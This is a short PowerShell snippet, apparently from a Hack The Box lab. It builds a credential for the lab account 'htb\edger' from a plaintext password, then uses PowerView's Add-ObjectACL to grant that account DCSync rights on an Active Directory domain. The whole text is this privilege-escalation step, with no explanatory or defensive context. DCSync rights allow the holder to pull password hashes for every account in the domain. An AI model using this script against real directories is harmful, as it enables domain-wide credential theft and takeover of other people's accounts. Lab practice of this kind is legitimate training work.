#converting to secure string

$pass = convertto-securestring 'password' -asplain -force

#loading the creds
$cred = new-object system.management.automation.pscredential('htb\edger', $pass)

Add-ObjectACL -PrincipalIdentity edger -Credential $cred -Rights DCsync
